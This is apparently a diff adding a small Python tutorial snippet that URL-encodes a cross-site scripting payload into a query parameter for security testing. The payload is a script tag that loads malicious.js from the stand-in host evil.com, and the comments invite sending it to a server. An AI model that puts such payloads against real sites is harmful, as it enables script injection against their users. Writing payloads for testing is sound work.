@@ -1,0 +1,11 @@
+import urllib.parse #Python Library
+ 
+Url = "http://dummy/getdb.php?data=" #Url to test
+ Payload = "<script src=\"http://www.evil.com/malicious.js\"></script>" #Payload for testing SQL, XSS etc.
+ 
+Encoded_Payload = urllib.parse.quote(Payload, safe ='') #Safe param specifies ASCII characters that should not be quoted. The default value is ‘/’ but I have explicitly provided “” means none.
+Encoded_url = Url + Encoded_Payload #Complete Payload
+ 
+print(Encoded_url)#You may also extend this code to save values in CSV or directly try `hitting the server’.
+
+> http://dummy/getdb.php?data=%3Cscript%20src%3D%22http%3A%2F%2Fwww.evil.com%2Fmalicious.js%22%3E%3C%2Fscript%3E
